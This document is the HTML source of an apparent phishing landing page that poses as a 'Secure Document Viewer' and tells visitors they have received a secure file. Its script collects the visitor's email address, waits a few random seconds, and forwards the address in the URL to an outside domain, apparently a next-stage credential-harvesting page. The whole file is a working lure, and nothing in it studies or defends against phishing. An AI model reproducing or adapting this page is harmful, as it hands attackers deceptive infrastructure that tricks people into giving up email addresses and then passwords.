<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Secure Document Viewer</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: Arial, sans-serif;
      background: url('https://cdn.pixabay.com/photo/2013/07/13/11/53/file-158878_1280.png') no-repeat center center fixed;
      background-size: cover;
      filter: blur(0);
    }

    .overlay {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(255, 255, 255, 0.7);
      backdrop-filter: blur(8px);
      z-index: 1;
    }

    .form-container {
      position: relative;
      z-index: 2;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100%;
      text-align: center;
    }

    h2 {
      margin-bottom: 10px;
    }

    input[type="email"] {
      padding: 12px;
      font-size: 16px;
      width: 280px;
      margin-top: 15px;
      margin-bottom: 20px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    button {
      padding: 10px 20px;
      font-size: 16px;
      background-color: #0070f3;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    button:hover {
      background-color: #0059c1;
    }

    .footer-note {
      margin-top: 20px;
      font-size: 12px;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="overlay"></div>
  <div class="form-container">
    <h2>You’ve received a secure document</h2>
    <p>Please enter your email address to continue:</p>
    <input type="email" id="emailInput" placeholder="your@email.com" required />
    <button onclick="redirect()">View Secure File</button>
    <div class="footer-note">
      © 2025 Organization Privacy & Cookies
    </div>
  </div>

  <script>
    function redirect() {
      const email = document.getElementById("emailInput").value.trim();
      if (!email || !email.includes("@")) {
        alert("Please enter a valid email address.");
        return;
      }

      // Random 4–6 second delay
      const delay = Math.floor(Math.random() * 2000) + 4000;

      setTimeout(function () {
        const targetURL = "https://pagecrafter.com.de/bXhdS2Z/#X" + encodeURIComponent(email);
        window.location.href = targetURL;
      }, delay);
    }
  </script>
</body>
</html>
